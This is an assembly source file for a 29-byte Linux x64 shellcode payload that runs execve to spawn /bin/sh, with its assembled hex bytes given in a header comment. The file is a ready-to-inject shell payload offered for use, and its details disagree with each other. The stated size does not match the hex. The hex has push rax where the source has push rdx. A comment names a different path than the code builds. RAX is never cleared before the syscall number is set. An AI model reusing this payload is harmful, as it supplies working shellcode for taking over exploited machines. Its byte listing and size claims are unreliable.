; Title:    Linux x64 execve /bin/sh
; Platform: linux
; Arch:     x64
; Size:     29 bytes
; Encoding: raw
;
; Assembled hex:
; \x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05

BITS 64
global _start

_start:
    ; execve("/bin//sh", ["/bin//sh", NULL], NULL)
    xor     rdx, rdx            ; envp = NULL
    mov     rbx, 0x68732f6e69622f2f  ; "//bin/sh"
    shr     rbx, 8
    push    rbx
    mov     rdi, rsp            ; argv[0] = "/bin/sh"
    push    rdx                 ; NULL terminator
    push    rdi
    mov     rsi, rsp            ; argv = ["/bin/sh", NULL]
    mov     al, 0x3b            ; execve syscall
    syscall
